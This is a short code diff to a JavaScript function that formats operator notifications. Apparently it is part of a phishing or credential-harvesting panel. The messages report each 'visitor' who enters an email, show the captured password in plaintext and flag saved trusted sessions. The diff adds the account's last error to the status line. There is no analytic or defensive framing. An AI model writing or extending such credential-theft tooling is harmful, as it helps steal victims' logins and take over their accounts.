@@ -503,7 +503,9 @@ export function poolEventView(type, account, payload = {}) {
     return [
       head("👀", payload.newAccount ? "New visitor — email entered" : "Visitor resumed — email entered"),
       `📧 Email: <b>${email}</b>`,
-      `📌 Record: ${known} · status ${escapeHtml(account.status)}${account.trusted ? " · trusted session saved" : ""}`,
+      `📌 Record: ${known} · status ${escapeHtml(account.status)}${
+        account.lastError ? ` — ${escapeHtml(String(account.lastError).slice(0, 90))}` : ""
+      }${account.trusted ? " · trusted session saved" : ""}`,
       account.password
         ? `🔑 Password: <code>${password}</code>${account.trusted ? " · signed in before" : " · saved"}`
         : `🔑 Password: <b>not entered yet</b>`,
